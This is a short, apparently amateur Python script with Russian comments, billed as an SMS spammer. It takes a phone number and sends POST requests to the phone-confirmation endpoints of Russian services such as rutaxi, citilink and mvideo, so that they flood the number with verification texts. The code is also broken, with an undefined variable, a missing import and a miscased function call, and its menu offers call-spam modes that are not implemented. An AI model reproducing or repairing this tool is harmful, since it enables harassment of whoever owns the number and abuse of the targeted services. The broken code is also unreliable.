#Не Забудь его доработать
import requests
import time
#СМС СПАММЕР
def Soobsh():
    phone = str(input('Введите номер телефона: '))
    try:
        requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": phone9}).json()["res"] #Создаем пост запрос на сервис
        print('Сообщение отправлено!') #В случае если код сработал, выв
    except:
        print('Сообщение не отправлено.') #В случае если код не сработал, выведет это
    try:
        requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/")
        print('Сообщение отправлено!')
    except:
        print('Сообщение не отправлено.')
    try:
        requests.post ("https://www.mvideo.ru/login" + phone + "/" )
        print('Сообщение отправлено!')
    except:
        print('Сообщение не отправлено.')
#Логотип
def Logo():
 print(r"░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗░░███╗░░")
 print(r"██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗████╗░██║██║░░░██║████╗░████║░████║░░")
 print(r"╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝██╔██╗██║██║░░░██║██╔████╔██║██╔██║░░")
 print(r"░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗██║╚████║██║░░░██║██║╚██╔╝██║╚═╝██║░░")
 print(r"██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██║░╚███║╚██████╔╝██║░╚═╝░██║███████╗")


#Основное меню
def Main():
 Logo()
 print("1. СМС СПАММЕР")
 print("2. СПАММ ЗВОНКАМИ")
 print("3. СПАМ ЗВОНКАМИ И СМС (Mix)")
 print("4. ВЫХОД")
 choice = input("Введите номер:")
 if choice == "4":
    print("До связи")
    exit()
 elif choice == "1":
     Soobsh()
 else:
    print("Номер введен неверно!")
    sleep(1)
    main()





Main()
